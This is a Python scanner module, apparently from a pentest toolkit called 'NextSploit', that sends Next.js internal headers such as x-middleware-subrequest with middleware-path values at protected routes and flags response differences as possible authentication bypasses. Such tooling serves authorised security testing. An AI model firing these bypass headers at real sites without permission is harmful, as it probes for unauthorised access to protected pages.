#!/usr/bin/env python3
"""
NextSploit — Internal Header Differential Fuzzer

Discovers Next.js internal header/routing differentials and potential auth bypasses
by testing internal Next.js headers against protected routes and comparing baseline responses.

Headers tested:
  - x-middleware-subrequest
  - x-middleware-prefetch
  - x-middleware-skip
  - Next-Router-State-Tree
  - Next-Url
  - Next-Rewrite-Url
  - Next-Resume
  - RSC
  - x-nextjs-data
"""

import hashlib
import requests

from core.config import ScanConfig
from core.reporter import ModuleResult, Finding, ScanStatus
from core.output import (
    log_info, log_success, log_warning, log_critical, log_debug,
    log_trace, print_module_header, print_finding
)
from core.fp_engine import is_waf_block

MODULE_NAME = "HEADER-FUZZER"
MODULE_TITLE = "Next.js Internal Header Differential Fuzzer"
MODULE_SEVERITY = "HIGH"

INTERNAL_HEADERS = {
    "x-middleware-subrequest": ["middleware", "src/middleware", "pages/_middleware", "middleware.js"],
    "x-middleware-prefetch": ["1"],
    "x-middleware-skip": ["1"],
    "Next-Router-State-Tree": [
        "%5B%22%22%2C%7B%22children%22%3A%5B%22dashboard%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D"
    ],
    "Next-Url": ["/dashboard", "/admin"],
    "Next-Rewrite-Url": ["/dashboard", "/admin"],
    "Next-Resume": ["1"],
    "RSC": ["1"],
    "x-nextjs-data": ["1"],
}


class HeaderFuzzer:
    def __init__(self, config: ScanConfig):
        self.c = config
        self.session = config.create_session()

    def run(self) -> list:
        routes = getattr(self.c, "protected_routes", ["/dashboard", "/admin", "/account", "/api/me"])
        target = self.c.target.rstrip("/")
        findings = []

        for route in routes:
            url = f"{target}{route}"
            try:
                base = self.session.get(url, timeout=self.c.timeout, allow_redirects=False)
                if is_waf_block(base):
                    continue
                # If baseline is 404, there is no route to bypass, so ignore to avoid prefetch false positives
                if base.status_code == 404:
                    continue
                base_sig = (base.status_code, hashlib.md5(base.content).hexdigest())
            except Exception:
                continue

            for hname, values in INTERNAL_HEADERS.items():
                for val in values:
                    # Respect max-requests killswitch
                    if self.c.killswitch and not self.c.killswitch.count_request():
                        break

                    try:
                        r = self.session.get(
                            url,
                            headers={hname: val},
                            timeout=self.c.timeout,
                            allow_redirects=False
                        )
                        if is_waf_block(r):
                            continue

                        sig = (r.status_code, hashlib.md5(r.content).hexdigest())
                        if sig != base_sig:
                            # Significant delta detected
                            delta = {
                                "route": route,
                                "header": hname,
                                "value": val[:60],
                                "baseline": {
                                    "status": base.status_code,
                                    "length": len(base.content)
                                },
                                "result": {
                                    "status": r.status_code,
                                    "length": len(r.content)
                                },
                                "location": r.headers.get("Location", "")
                            }
                            findings.append(delta)
                            log_warning(
                                f"DELTA on {route} | {hname}: {val[:25]} "
                                f"-> [{r.status_code}] {len(r.content)}b (base [{base.status_code}] {len(base.content)}b)"
                            )
                    except Exception:
                        pass

        return findings


def scan(config: ScanConfig) -> ModuleResult:
    result = ModuleResult(
        cve=MODULE_NAME,
        title=MODULE_TITLE,
        severity=MODULE_SEVERITY,
        status=ScanStatus.SAFE
    )

    print_module_header(MODULE_NAME, MODULE_TITLE, MODULE_SEVERITY)
    fuzzer = HeaderFuzzer(config)

    log_info("Fuzzing Next.js internal headers against protected routes...")
    deltas = fuzzer.run()

    if deltas:
        detail = f"Discovered {len(deltas)} header differential response(s)"
        log_critical(detail)
        print_finding(MODULE_NAME, detail, {"deltas": deltas[:5]})
        result.add_finding(Finding(
            cve=MODULE_NAME,
            severity=MODULE_SEVERITY,
            title="Next.js Internal Header Response Differential",
            status=ScanStatus.VULNERABLE,
            detail=detail,
            evidence={"deltas": deltas}
        ))
    else:
        log_success("No internal header response differentials detected")

    return result
